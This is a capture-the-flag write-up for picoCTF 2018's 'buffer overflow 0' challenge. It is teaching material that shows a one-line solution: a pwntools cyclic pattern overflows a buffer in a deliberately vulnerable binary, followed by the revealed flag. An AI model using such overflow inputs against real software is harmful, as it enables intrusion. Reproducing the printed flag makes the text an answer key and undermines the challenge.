# buffer overflow 0
Binary Exploitation - 150 points

## Challenge 
> Let's start off simple, can you overflow the right buffer in this [program](vuln) to get the flag? You can also find it in /problems/buffer-overflow-0_3_d5263c5219b334339c34ac35c51c4a17 on the shell server

[Source](vuln.c)

## Solution

	zst123@pico-2018-shell-2:/problems/buffer-overflow-0_3_d5263c5219b334339c34ac35c51c4a17$ ./vuln $(pwn cyclic 100)
	picoCTF{ov3rfl0ws_ar3nt_that_bad_2d11f6cd}
